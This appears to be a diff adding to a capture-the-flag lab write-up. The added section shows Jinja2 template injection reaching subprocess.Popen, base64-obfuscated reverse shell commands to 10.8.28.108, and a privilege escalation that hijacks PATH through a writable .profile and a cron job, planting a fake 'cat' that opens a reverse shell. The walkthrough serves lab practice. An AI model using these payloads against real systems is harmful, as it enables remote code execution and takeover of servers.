@@ -202,3 +202,53 @@ Type "help", "copyright", "credits" or "license" for more information.
 Set manualy X-Forwarded-For: 127.0.0.1 to reguest
 
 Use CyberChef for xor to get **AyhamDeebugg** from 2000000000251c0d0318061e
+
+
+{{"".__class__.__mro__[1].__subclasses__()}}
+
+We are able to retrieve all classes used in the application and find the class **subprocess.Popen** like in the article. It is located at index 415. Found by a simple python program, we wrote iterating through the returned array. It differs from case to case.
+
+So, we are able to call subprocess.Popen with the following payload:
+
+{{"".__class__.__mro__[1].__subclasses__()[415]}} 
+
+
+{{"".__class__.__mro__[1].__subclasses__()[415]("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjI4LjEwOC85MDAxIDA+JjE= | base64 -d | bash",shell=True,stdout=-1).communicate()}}
+{{"".__class__.__mro__[1].__subclasses__()[416]("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjI4LjEwOC85MDAxIDA+JjEK | base64 -d | bash",shell=True,stdout=-1).communicate()}}
+
+**Get reverse shell as user Ayham**
+
+run linpeas and found
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+*  *    * * *   root    curl -K /home/F30s/site_check
+*  *    * * *   F30s    bash -lc 'cat /home/F30s/health_check'
+
+Privilage Escalation
+
+While enumerating, we find a writable .profile file in F30s home directory. 
+
+We are able to manipulate his PATH variable which is helpful, because the cronjob for F30s is running bash with the tag -l which means it act as if it had been invoked as a login shell referring the PATH variable.
+
+```           
+ayham@482cbf2305ae:/home/F30s$ echo 'PATH="/home/ayham/bin/:$PATH"' > .profile
+ayham@482cbf2305ae:/home/F30s$ cat .profile
+cat .profile
+PATH="/home/ayham/bin/:$PATH"
+ayham@482cbf2305ae:~/bin$ echo '#!/bin/bash' > cat
+echo '#!/bin/bash' > cat
+ayham@482cbf2305ae:~/bin$ echo 'bash -i >& /dev/tcp/10.8.28.108/4445 0>&1' >> cat
+< 'bash -i >& /dev/tcp/10.8.28.108/4445 0>&1' >> cat
+ayham@482cbf2305ae:~/bin$ more cat
+more cat
+#!/bin/bash
+bash -i >& /dev/tcp/10.8.28.108/4445 0>&1
+```
+
+
